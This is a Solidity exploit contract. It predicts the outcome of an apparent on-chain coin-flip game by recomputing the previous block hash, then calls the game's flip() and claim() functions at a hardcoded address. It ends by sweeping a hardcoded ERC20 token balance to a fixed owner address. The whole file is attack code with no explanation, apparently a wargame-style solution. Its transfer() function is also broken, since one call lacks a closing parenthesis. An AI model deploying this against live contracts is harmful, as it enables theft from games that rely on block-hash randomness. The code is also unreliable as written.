// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface Flip {
  function flip(bool) external returns(bool);
  function claim() external;
}

contract CoinFlip {

  address immutable owner = 0xa561cC2c0C33FbEB03B7B89Fd435709e56b0C016;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function flip() public returns (bool) {
    require(msg.sender == owner, "nope");
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    Flip(0xc6724Db51bFF2F9dc91f6B814426453ddB844907).flip(side);
    return side;
  }

  function claim() public {
    require(msg.sender == owner, "nope");
    Flip(0xc6724Db51bFF2F9dc91f6B814426453ddB844907).claim();
  }

  function transfer() public {
    require(msg.sender == owner, "nope");
    ERC20(0x0f212DAC9e43e68e9Dc30dbe54cD1aC95236DD05).transferFrom(address(this), owner, ERC20(0x0f212DAC9e43e68e9Dc30dbe54cD1aC95236DD05).balanceOf(address(this));
  }

}
